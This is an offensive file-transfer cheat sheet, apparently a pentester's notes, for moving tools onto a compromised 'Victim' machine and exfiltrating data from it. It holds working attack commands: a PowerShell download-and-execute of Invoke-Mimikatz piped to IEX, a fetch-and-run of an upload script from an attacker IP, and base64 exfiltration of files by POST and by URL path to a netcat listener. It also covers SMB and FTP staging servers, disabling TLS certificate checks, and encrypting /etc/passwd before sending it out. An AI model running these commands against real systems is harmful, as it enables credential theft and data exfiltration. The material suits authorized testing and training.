---
title: "File Transfers"
date: 2023-08-19
tags: [Files, Transfers, Powershell, Webdowload, SMB, FTP, Exfiltration]
---

## Downloads
### Base64

```bash {title="Attacker"}
❯ cat .ssh/id_rsa | base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVE<snip>SCBQUklWQVRFIEtFWS0tLS0tCg==
```

```powershell {title="Victim (Windows)"}
PS C:\Temp> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVE<snip>SCBQUklWQVRFIEtFWS0tLS0tCg=="))
```

```bash {title="Victim (Linux)"}
❯ echo "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVE<snip>SCBQUklWQVRFIEtFWS0tLS0tCg==" |base64 -d > /home/user/.ssh/id_rsa
```

### PowerShell Web Downloads

Multiple WebClient methods for downloading data from a remote

| Method | Desc |
|----------|-------|
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)| Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

```powershell {title=Net.WebClient.DownloadFile}
PS C:\Temp> (New-Object Net.WebClient).DownloadFile('<Target URL>','<Output>')
```

```powershell {title="NetWebClient.DownloadString - Download & Execute, curl2bash like"}
PS C:\Temp> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

> [!NOTE]  [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) and its aliases (iwr, curl and wget) can be used to download file with PS 3.0 ownwards but it's noticeably slower

```powershell {title="Bypass Untrusted SSL/TLS Certificate Warning"}
PS C:\Temp [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB

> [!HINT] Impackets smbserver is available out of the box in exegol !

```bash {title="Creating an SMB Server using impacket-smbserver"}
❯ smbserver.py share -smb2support /tmp/smbshare
Impacket for Exegol - v0.10.1.dev1+20230303.141054.8975ed2d - Copyright 2022 Fortra - forked by ThePorgs

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```powershell {title="Accessing the share without authentication"}
PS C:\User\Desktop> copy \\192.168.61.130\share\pwned
PS C:\User\Desktop> ls
Mode           LastWriteTime         Length Name
----           -------------         ------ ----
-a----         20-Aug-23 11:06       0      pwned
```

> [!INFO]- Creating an SMB Server with Username and Password
> 
> - Create the server
> ```bash
> ❯ smbserver.py share -smb2support /tmp/smbshare -user bob -password bob
> ```
>- Mount the share
> ```powershell
>	C:\User\Desktop> net use z: \\192.168.61.130\share /user:bob password
> ```
> - Access the file
> ```powershell
> 	C:\User\Desktop> copy z:\pwned
> ```
### FTP

> [!HINT] pyftpdlib python library is available out of the box in exegol !

```bash {title="Setting up ftp server using pyftpdlib python lib"}
❯ python3 -m pyftpdlib -p 21
[I 2023-08-20 12:56:17] >>> starting FTP server on 0.0.0.0:21, pid=1113 <<<
[I 2023-08-20 12:56:17] concurrency model: async
[I 2023-08-20 12:56:17] masquerade (NAT) address: None
[I 2023-08-20 12:56:17] passive ports: None
```

#### Using PowerShell

```powershell {title="Victim (Windows)"}
C:\User\Desktop> (New-Object Net.WebClient).DownloadFile('ftp://192.168.61.130/pwned', 'pwned')
```

#### Using FTP client

1. Using a file containing commands
```powershell {title="Victim (Windows)"}
C:\User\Desktop> cat ftpcmd
open 192.168.61.130
USER anonymous
GET pwned
bye

C:\User\Desktop> ftp -v -n -s:ftpcmd
```

2. Using the CLI directly
```powershell {title="Victim (Windows)"}
C:\User\Desktop> ftp
ftp> open 192.168.61.130
ftp> USER anonymous
ftp> GET pwned
ftp> bye
```

## Uploads

### Base64

```powershell {title="Victim (Windows)"}
PS C:\Users\bob> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
```

### Shell Web Uploads

Some cool programs to get a small webserver with upload capabilities:
1. `uploadserver` as a python module (source code [here](https://github.com/Densaugeo/uploadserver))
2. `updog` (source code [here](https://github.com/sc0tfree/updog))

> Following example are shown with `uploadserver`

Useful powershell script to upload a file to a webserver : https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1

```powershell {title="Victim (Windows)"}
PS C:\Users\bob> IEX(New-Object Net.WebClient).DownloadString('http://192.168.61.130/PSUpload.ps1')
PS C:\Users\bob> Invoke-FileUpload -Uri http://192.168.61.130/upload -File <file path>
```

Another way to exfiltrate a file is to convert its content to base64 and sending it either via post body or via url path:

```powershell {title="Victim (Windows)"}
PS C:\Users\bob> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\Users\bob> curl http://192.167.61.130 -Method POST -Body $b64
PS C:\Users\bob> curl "http://192.168.61.130/ + $b64"
```

```bash {title="Attacker (Linux)"}
❯ nc -lnvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from ::1.
Ncat: Connection from ::1:48330.
POST / HTTP/1.1
Host: localhost
User-Agent: curl/7.74.0
Accept: */*
Content-Length: 1101
Content-Type: application/x-www-form-urlencoded

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=m

❯ python3 -m uploadserver 80
File upload available at /upload
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [20/Aug/2023 20:49:06] "GET /IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= HTTP/1.1" 404 -
```

## Encryption
### Using [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) PowerShell script

```powershell {title="Import Invoke-AESEncryption module"}
PS C:\Users\bob> Import-Module .\Invoke-AESEncryption.ps1
```

**Example** 

```powershell {title="Encrypt with Invoke-AESEncryption.ps1"}
PS C:\Users\bob> Invoke-AESEncryption -Mode Encrypt -Key "AAAAAAAAAAAAAAAA" -Path secure_file.txt

File encrypted to C:\Users\bob\secure_file.aes
```

### Using openssl

**Encrypt**

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

**Decrypt**

```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd  
```

